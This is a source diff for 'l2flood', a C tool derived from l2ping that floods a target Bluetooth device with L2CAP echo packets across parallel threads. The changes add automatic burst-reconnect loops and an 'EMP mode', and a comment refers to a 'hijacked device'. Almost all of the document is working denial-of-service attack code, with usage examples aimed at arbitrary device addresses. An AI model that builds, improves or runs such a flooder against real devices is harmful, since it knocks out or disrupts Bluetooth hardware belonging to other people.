@@ -61,7 +61,7 @@ static int size    = 44;
 static int delay   = 1;
 #endif
 static int count   = -1;
-static int timeout = 10;
+static int timeout = 5; /* increase this depending on how long range the hijacked device is */
 static int reverse = 0;
 static int verify = 0;
 
@@ -138,52 +138,52 @@ static long parse_positive_int(const char *s, const char *name)
 
 static void usage(void)
 {
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	printf("l2flood - L2CAP flood (OpenMP parallel build)\n\n");
 	printf("Usage:\n");
 	printf("  l2flood [options] <bdaddr>\n\n");
-#else
+	#else
 	printf("l2flood - L2CAP flood (serial build)\n\n");
 	printf("Usage:\n");
 	printf("  l2flood [options] <bdaddr>\n\n");
-#endif
+	#endif
 	printf("Arguments:\n");
 	printf("  <bdaddr>       Target Bluetooth address (XX:XX:XX:XX:XX:XX)\n\n");
 	printf("Options:\n");
 	printf("  -i <device>    HCI adapter: 'hci0', 'hci1', etc. (default: any)\n");
 	printf("  -s <bytes>     L2CAP echo payload size (default: %d)\n",
-#ifdef _OPENMP
-		600
-#else
-		44
-#endif
+		   #ifdef _OPENMP
+		   600
+		   #else
+		   44
+		   #endif
 	);
 	printf("  -c <count>     Number of packets to send, -1 for infinite (default: -1)\n");
 	printf("  -t <seconds>   Response timeout per packet (default: 10)\n");
 	printf("  -d <seconds>   Delay between packets (default: %d)\n",
-#ifdef _OPENMP
-		0
-#else
-		1
-#endif
+		   #ifdef _OPENMP
+		   0
+		   #else
+		   1
+		   #endif
 	);
 	printf("  -f             Flood mode: set delay to 0\n");
 	printf("  -r             Reverse: send echo responses instead of requests\n");
 	printf("  -v             Verify response payload matches request\n");
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	printf("  -n <threads>   Number of parallel threads (default: number of CPUs)\n");
 	printf("  -R             EMP mode: fire-and-forget burst-reconnect cycling\n");
-#endif
+	#endif
 	printf("\nExamples:\n");
 	printf("  l2flood -i hci1 AA:BB:CC:DD:EE:FF\n");
 	printf("  l2flood -i hci0 -s 600 -c 1000 AA:BB:CC:DD:EE:FF\n");
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	printf("  l2flood -i hci1 -R AA:BB:CC:DD:EE:FF\n");
-#endif
+	#endif
 }
 
 /* ------------------------------------------------------------
- *  Normal mode
+ *  Normal mode with burst-reconnect cycling
  * ----------------------------------------------------------- */
 static void ping_normal(char *svr)
 {
@@ -193,8 +193,10 @@ static void ping_normal(char *svr)
 	unsigned char *send_buf;
 	unsigned char *recv_buf;
 	char str[18];
-	int i, sk, lost;
+	int i, sk, lost, printed = 0;
 	uint8_t id;
+	int reuse = 1;
+	struct linger ling = {1, 0};
 
 	memset(&sa, 0, sizeof(sa));
 	sa.sa_handler = sigint_handler;
@@ -207,59 +209,69 @@ static void ping_normal(char *svr)
 		exit(1);
 	}
 
-	/* Create socket */
-	sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
-	if (sk < 0) {
-		perror("Can't create socket");
-		goto error;
-	}
-
-	/* Bind to local address */
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	bacpy(&addr.l2_bdaddr, &bdaddr);
-
-	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
-		perror("Can't bind socket");
-		goto error;
-	}
-
-	/* Connect to remote device */
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	str2ba(svr, &addr.l2_bdaddr);
-
-	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
-		perror("Can't connect");
-		goto error;
-	}
-
-	/* Get local address */
-	memset(&addr, 0, sizeof(addr));
-	optlen = sizeof(addr);
-
-	if (getsockname(sk, (struct sockaddr *) &addr, &optlen) < 0) {
-		perror("Can't get local address");
-		goto error;
-	}
-
-	ba2str(&addr.l2_bdaddr, str);
-	/* Only one thread prints the banner. */
-#ifdef _OPENMP
-	#pragma omp single nowait
-#endif
-	printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);
-
 	/* Initialize send buffer */
 	for (i = 0; i < size; i++)
 		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';
 
 	id = ident;
+	sk = -1;
 
+	/* Burst-reconnect loop with timeout response handling */
 	while (count == -1 || count-- > 0) {
 		struct timeval tv_send, tv_recv, tv_diff;
 		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
 		l2cap_cmd_hdr *recv_cmd = (l2cap_cmd_hdr *) recv_buf;
+
+		/* Reconnect if needed */
+		if (sk < 0) {
+			sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
+			if (sk < 0) {
+				perror("Can't create socket");
+				usleep(2000);
+				count++;  /* retry without decrementing count */
+				continue;
+			}
+
+			setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+			setsockopt(sk, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
+
+			memset(&addr, 0, sizeof(addr));
+			addr.l2_family = AF_BLUETOOTH;
+			bacpy(&addr.l2_bdaddr, &bdaddr);
+
+			if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+				perror("Can't bind socket");
+				close(sk);
+				sk = -1;
+				goto error;
+			}
+
+			memset(&addr, 0, sizeof(addr));
+			addr.l2_family = AF_BLUETOOTH;
+			str2ba(svr, &addr.l2_bdaddr);
+
+			if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+				perror("Can't connect");
+				close(sk);
+				sk = -1;
+				usleep(2000);
+				count++;  /* retry without decrementing count */
+				continue;
+			}
+
+			if (!printed) {
+				memset(&addr, 0, sizeof(addr));
+				optlen = sizeof(addr);
+				if (getsockname(sk, (struct sockaddr *) &addr, &optlen) == 0) {
+					ba2str(&addr.l2_bdaddr, str);
+					#ifdef _OPENMP
+					#pragma omp single nowait
+					#endif
+					printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);
+				}
+				printed = 1;
+			}
+		}
 
 		/* Build command header */
 		send_cmd->ident = id;
@@ -274,11 +286,12 @@ static void ping_normal(char *svr)
 
 		/* Send Echo Command */
 		if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0) {
-			perror("Send failed");
-			goto error;
+			close(sk);
+			sk = -1;
+			continue;
 		}
 
-		/* Wait for Echo Response */
+		/* Wait for Echo Response with timeout */
 		lost = 0;
 		while (1) {
 			struct pollfd pf[1];
@@ -289,7 +302,9 @@ static void ping_normal(char *svr)
 
 			if ((err = poll(pf, 1, timeout * 1000)) < 0) {
 				perror("Poll failed");
-				goto error;
+				close(sk);
+				sk = -1;
+				break;
 			}
 
 			if (!err) {
@@ -299,12 +314,15 @@ static void ping_normal(char *svr)
 
 			if ((err = recv(sk, recv_buf, L2CAP_CMD_HDR_SIZE + size, 0)) < 0) {
 				perror("Recv failed");
-				goto error;
+				close(sk);
+				sk = -1;
+				break;
 			}
 
-			if (!err){
-				printf("Disconnected\n");
-				goto error;
+			if (!err) {
+				close(sk);
+				sk = -1;
+				break;
 			}
 
 			recv_cmd->len = btohs(recv_cmd->len);
@@ -319,20 +337,22 @@ static void ping_normal(char *svr)
 
 			if (recv_cmd->code == L2CAP_COMMAND_REJ) {
 				printf("Peer doesn't support Echo packets\n");
+				close(sk);
+				sk = -1;
 				goto error;
 			}
-
 		}
+
 		/* Both counters are shared across threads; atomic is required. */
-#ifdef _OPENMP
+		#ifdef _OPENMP
 		#pragma omp atomic
-#endif
+		#endif
 		sent_pkt++;
 
 		if (!lost) {
-#ifdef _OPENMP
+			#ifdef _OPENMP
 			#pragma omp atomic
-#endif
+			#endif
 			recv_pkt++;
 
 			gettimeofday(&tv_recv, NULL);
@@ -342,25 +362,29 @@ static void ping_normal(char *svr)
 				/* Check payload length */
 				if (recv_cmd->len != size) {
 					fprintf(stderr, "Received %d bytes, expected %d\n",
-						   recv_cmd->len, size);
+							recv_cmd->len, size);
+					close(sk);
+					sk = -1;
 					goto error;
 				}
 
 				/* Check payload */
 				if (memcmp(&send_buf[L2CAP_CMD_HDR_SIZE],
-						   &recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
+					&recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
 					fprintf(stderr, "Response payload different.\n");
-					goto error;
-				}
+				close(sk);
+				sk = -1;
+				goto error;
+					}
 			}
 
-#ifdef _OPENMP
+			#ifdef _OPENMP
 			printf("%d bytes from %s id %d time %.2fms thread %d\n", recv_cmd->len, svr,
 				   id - ident, tv2fl(tv_diff), omp_get_thread_num());
-#else
+			#else
 			printf("%d bytes from %s id %d time %.2fms\n", recv_cmd->len, svr,
 				   id - ident, tv2fl(tv_diff));
-#endif
+			#endif
 
 		} else {
 			printf("no response from %s: id %d\n", svr, id - ident);
@@ -374,13 +398,17 @@ static void ping_normal(char *svr)
 		if (++id > 254)
 			id = ident;
 	}
+
+	if (sk >= 0)
+		close(sk);
 	sigint_handler(0);
 	free(send_buf);
 	free(recv_buf);
 	return;
 
-error:
-	close(sk);
+	error:
+	if (sk >= 0)
+		close(sk);
 	free(send_buf);
 	free(recv_buf);
 	exit(1);
@@ -496,7 +524,7 @@ static void ping_emp(char *svr)
 						if (err != 0) {
 							if (err != last_err || connect_fails % 50 == 0) {
 								fprintf(stderr, "EMP connect: %s (attempt %d)\n",
-									strerror(err), connect_fails + 1);
+										strerror(err), connect_fails + 1);
 								last_err = err;
 							}
 							connect_fails++;
@@ -506,13 +534,13 @@ static void ping_emp(char *svr)
 						connect_fails++;
 						if (connect_fails % 50 == 0)
 							fprintf(stderr, "EMP connect: poll timeout (attempt %d)\n",
-								connect_fails);
-						close(sk); sk = -1; usleep(2000); continue;
+									connect_fails);
+							close(sk); sk = -1; usleep(2000); continue;
 					}
 				} else {
 					if (errno != last_err || connect_fails % 50 == 0) {
 						fprintf(stderr, "EMP connect: %s (attempt %d)\n",
-							strerror(errno), connect_fails + 1);
+								strerror(errno), connect_fails + 1);
 						last_err = errno;
 					}
 					connect_fails++;
@@ -567,8 +595,8 @@ static void ping_emp(char *svr)
 			if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0)
 				break; /* link died mid-burst, fall through to close */
 
-			#pragma omp atomic
-			sent_pkt++;
+				#pragma omp atomic
+				sent_pkt++;
 
 			if (++id > 254) id = ident;
 		}
@@ -593,11 +621,11 @@ static void ping_emp(char *svr)
 /* Wrapper */
 static void ping(char *svr)
 {
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	if (reconnect)
 		ping_emp(svr);
 	else
-#endif
+		#endif
 		ping_normal(svr);
 }
 
@@ -614,10 +642,10 @@ int main(int argc, char *argv[])
 
 	/* Default options */
 	bacpy(&bdaddr, BDADDR_ANY);
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	threads = sysconf(_SC_NPROCESSORS_ONLN);
 	if (threads < 1) threads = 1;
-#endif
+	#endif
 
 	/* Manual argument parsing to avoid GNU getopt permutation issues.
 	 * Scan argv once: flags with arguments consume the next element,
@@ -643,107 +671,107 @@ int main(int argc, char *argv[])
 		}
 
 		switch (argv[i][1]) {
-		case 'i':
-			if (++i >= argc) {
-				fprintf(stderr, "Error: -i requires an argument\n");
-				exit(1);
-			}
-			if (!strncasecmp(argv[i], "hci", 3))
-				hci_devba(atoi(argv[i] + 3), &bdaddr);
+			case 'i':
+				if (++i >= argc) {
+					fprintf(stderr, "Error: -i requires an argument\n");
+					exit(1);
+				}
+				if (!strncasecmp(argv[i], "hci", 3))
+					hci_devba(atoi(argv[i] + 3), &bdaddr);
 			else
 				str2ba(argv[i], &bdaddr);
 			break;
 
-		case 'd':
-			if (++i >= argc) {
-				fprintf(stderr, "Error: -d requires an argument\n");
-				exit(1);
-			}
-			val = parse_positive_int(argv[i], "d");
-			if (val < 0) exit(1);
-			delay = (int)val;
+			case 'd':
+				if (++i >= argc) {
+					fprintf(stderr, "Error: -d requires an argument\n");
+					exit(1);
+				}
+				val = parse_positive_int(argv[i], "d");
+				if (val < 0) exit(1);
+				delay = (int)val;
 			break;
 
-		case 'f':
-			delay = 0;
-			break;
+			case 'f':
+				delay = 0;
+				break;
 
-		case 'r':
-			reverse = 1;
-			break;
+			case 'r':
+				reverse = 1;
+				break;
 
-		case 'v':
-			verify = 1;
-			break;
+			case 'v':
+				verify = 1;
+				break;
 
-		case 'c':
-			if (++i >= argc) {
-				fprintf(stderr, "Error: -c requires an argument\n");
+			case 'c':
+				if (++i >= argc) {
+					fprintf(stderr, "Error: -c requires an argument\n");
+					exit(1);
+				}
+				count = atoi(argv[i]);
+				break;
+
+			case 't':
+				if (++i >= argc) {
+					fprintf(stderr, "Error: -t requires an argument\n");
+					exit(1);
+				}
+				val = parse_positive_int(argv[i], "t");
+				if (val < 0) exit(1);
+				if (val == 0) {
+					fprintf(stderr, "Error: -t timeout must be > 0\n");
+					exit(1);
+				}
+				timeout = (int)val;
+				break;
+
+			case 's':
+				if (++i >= argc) {
+					fprintf(stderr, "Error: -s requires an argument\n");
+					exit(1);
+				}
+				val = parse_positive_int(argv[i], "s");
+				if (val < 0) exit(1);
+				if (val == 0) {
+					fprintf(stderr, "Error: -s size must be > 0\n");
+					exit(1);
+				}
+				if (val > 65535) {
+					fprintf(stderr, "Error: -s size must be <= 65535\n");
+					exit(1);
+				}
+				size = (int)val;
+				break;
+
+				#ifdef _OPENMP
+			case 'R':
+				reconnect = 1;
+				break;
+
+			case 'n':
+				if (++i >= argc) {
+					fprintf(stderr, "Error: -n requires an argument\n");
+					exit(1);
+				}
+				val = parse_positive_int(argv[i], "n");
+				if (val < 0) exit(1);
+				if (val == 0) {
+					fprintf(stderr, "Error: -n threads must be > 0\n");
+					exit(1);
+				}
+				threads = (int)val;
+				break;
+				#endif
+
+			case 'h':
+				usage();
+				exit(0);
+
+			default:
+				fprintf(stderr, "Error: unknown option '-%c'\n\n", argv[i][1]);
+				usage();
 				exit(1);
-			}
-			count = atoi(argv[i]);
-			break;
-
-		case 't':
-			if (++i >= argc) {
-				fprintf(stderr, "Error: -t requires an argument\n");
-				exit(1);
-			}
-			val = parse_positive_int(argv[i], "t");
-			if (val < 0) exit(1);
-			if (val == 0) {
-				fprintf(stderr, "Error: -t timeout must be > 0\n");
-				exit(1);
-			}
-			timeout = (int)val;
-			break;
-
-		case 's':
-			if (++i >= argc) {
-				fprintf(stderr, "Error: -s requires an argument\n");
-				exit(1);
-			}
-			val = parse_positive_int(argv[i], "s");
-			if (val < 0) exit(1);
-			if (val == 0) {
-				fprintf(stderr, "Error: -s size must be > 0\n");
-				exit(1);
-			}
-			if (val > 65535) {
-				fprintf(stderr, "Error: -s size must be <= 65535\n");
-				exit(1);
-			}
-			size = (int)val;
-			break;
-
-#ifdef _OPENMP
-		case 'R':
-			reconnect = 1;
-			break;
-
-		case 'n':
-			if (++i >= argc) {
-				fprintf(stderr, "Error: -n requires an argument\n");
-				exit(1);
-			}
-			val = parse_positive_int(argv[i], "n");
-			if (val < 0) exit(1);
-			if (val == 0) {
-				fprintf(stderr, "Error: -n threads must be > 0\n");
-				exit(1);
-			}
-			threads = (int)val;
-			break;
-#endif
-
-		case 'h':
-			usage();
-			exit(0);
-
-		default:
-			fprintf(stderr, "Error: unknown option '-%c'\n\n", argv[i][1]);
-			usage();
-			exit(1);
 		}
 	}
 
@@ -755,13 +783,13 @@ int main(int argc, char *argv[])
 
 	if (!valid_bdaddr(target)) {
 		fprintf(stderr, "Error: '%s' is not a valid BD_ADDR (expected XX:XX:XX:XX:XX:XX)\n",
-			target);
+				target);
 		exit(1);
 	}
 
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	#pragma omp parallel num_threads(threads)
-#endif
+	#endif
 	{
 		ping(target);
 	}
